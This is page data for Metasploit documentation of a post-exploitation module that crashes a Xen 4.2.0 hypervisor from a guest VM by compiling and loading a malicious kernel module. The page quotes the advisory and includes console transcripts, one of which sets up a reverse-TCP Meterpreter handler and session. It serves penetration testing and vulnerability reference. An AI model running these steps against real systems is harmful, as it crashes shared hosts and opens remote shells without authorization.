{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/linux/dos/xen_420_dos","result":{"data":{"moduleMetadataJson":{"id":"e1ec5f72-7d66-57fb-8034-938466c4b937","name":"Linux DoS Xen 4.2.0 2012-5525","fullname":"post/linux/dos/xen_420_dos","description":"This module causes a hypervisor crash in Xen 4.2.0 when invoked from a\n        paravirtualized VM, including from dom0.  Successfully tested on Debian 7\n        3.2.0-4-amd64 with Xen 4.2.0.","rank":300,"fields":{"detailsSlug":"/modules/details/post/linux/dos/xen_420_dos","documentationSlug":"/modules/documentation/post/linux/dos/xen_420_dos"},"documentation":{"html":"<p>This is a post exploitation module that exploits a memory corruption bug in Xen\n4.2.0, causing a denial-of-service against the hypervisor from a guest VM. From\nthe original advisory:</p>\n<blockquote>\n<p>Downgrading the grant table version of a guest involves freeing its\nstatus pages. This freeing was incomplete - the page(s) are freed back\nto the allocator, but not removed from the domain's tracking\nlist. This would cause list corruption, eventually leading to a\nhypervisor crash.</p>\n</blockquote>\n<h2 id=\"mechanism\" style=\"position:relative;\"><a href=\"#mechanism\" aria-label=\"mechanism permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mechanism</h2>\n<p>This module aims to be portable by building the exploit module on the target\nmachine directly, building a malicious Linux Kernel Module (LKM) and inserting it\ninto the kernel of the paravirtualized host. It is necessary to build the\nkernel module on the fly, since kernel ABIs are notoriously unstable and\nunlikely to work between multiple kernel versions.</p>\n<p>This module is tested on Debian and Ubuntu hosts running various versions of\nXen. Because the LKM is built at exploit-time, it requires that build tools and\nkernel headers for the currently-running kernel to exist on the target machine.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>Failure (bad Xen version):</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/handler\nmsf exploit(handler) &gt; set payload linux/x86/meterpreter/reverse_tcp\npayload =&gt; linux/x86/meterpreter/reverse_tcp\nmsf exploit(handler) &gt; set lhost 192.168.1.1\nlhost =&gt; 192.168.1.1\nmsf exploit(handler) &gt; run\n\n[*] Started reverse TCP handler on 192.168.1.1:4444\n[*] Starting the payload handler...\n[*] Transmitting intermediate stager for over-sized stage...(105 bytes)\n[*] Sending stage (1495599 bytes) to 192.168.1.1\n[*] Meterpreter session 1 opened (192.168.1.1:4444 -&gt; 192.168.1.2:43488) at 2016-07-13 00:27:31 -0500\n\nmeterpreter &gt;\nmeterpreter &gt; background\n[*] Backgrounding session 1...\nmsf exploit(handler) &gt; use post/linux/dos/xen_420_dos\nmsf post(xen_420_dos) &gt; set session -1\nsession =&gt; -1\nmsf post(xen_420_dos) &gt; run\n\n[*] Detecting requirements...\n[+] Detected root privilege\n[+] Detected build-essential\n[+] Detected Xen\n[+] Detected running Xen\n[*] Xen Version: 4.6.0\n[-] Sorry, wrong Xen Version\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Success:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf post(xen_420_dos) &gt; run\n\n[*] Detecting requirements...\n[+] Detected root privilege\n[+] Detected build-essential\n[+] Detected Xen\n[+] Detected running Xen\n[*] Xen Version: 4.2.0\n[-] Detected correct Xen version\n[*] DoS was successful!\n[*] Post module execution completed\n[*] 192.168.1.2 - Command shell session 1 closed.  Reason: Died from EOFError</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"future-work\" style=\"position:relative;\"><a href=\"#future-work\" aria-label=\"future work permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Future Work</h2>\n<p>A kernel module compilation mixin that works like the Dynamic Kernel Module\nSupport (DKMS) framework, would be useful in order to allow other kernel-level\nexploits to be built as-needed. Supporting this using the Metasploit Post\nExploitation API and supporting more Linux distributions would make similar\nexploits easier to build.</p>"}}},"pageContext":{"id":"e1ec5f72-7d66-57fb-8034-938466c4b937"}}}